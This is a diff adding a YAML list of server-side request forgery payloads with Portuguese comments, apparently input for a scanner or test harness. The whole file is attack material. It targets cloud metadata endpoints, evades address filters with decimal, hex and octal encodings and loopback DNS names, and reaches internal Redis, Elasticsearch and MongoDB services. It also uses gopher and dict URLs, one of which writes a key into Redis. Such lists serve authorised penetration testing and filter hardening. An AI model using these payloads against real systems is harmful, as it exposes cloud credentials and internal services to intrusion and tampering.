@@ -1,0 +1,22 @@
+payloads:
+  # --- AWS / Cloud Metadata (Puro) ---
+  - "http://169.254.169.254/latest/meta-data/"
+  - "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+  
+  # --- AWS Metadata (Bypasses de Filtro) ---
+  - "http://2852039166/"                # Decimal
+  - "http://0xA9FEA9FE/"                # Hex
+  - "http://0251.0376.0251.0376/"       # Octal
+  - "http://169.254.169.254.nic.io/"    # DNS Spoofing
+  
+  # --- Localhost / Serviços Internos (Bypasses) ---
+  - "http://127.1:6379"                 # Redis abreviado
+  - "http://0.0.0.0:9200"               # Elasticsearch via 0.0.0.0
+  - "http://[::]:27017"                 # MongoDB via IPv6
+  - "http://localhost.charlesproxy.com" # DNS que aponta para 127.0.0.1
+  - "http://localtest.me"               # Outro DNS para loopback
+  - "http://127.0.0.1.nip.io"           # Wildcard DNS
+  
+  # --- Protocolos alternativos (se o app aceitar) ---
+  - "gopher://127.0.0.1:6379/_SET%20test%20success"
+  - "dict://127.0.0.1:11211/stat"
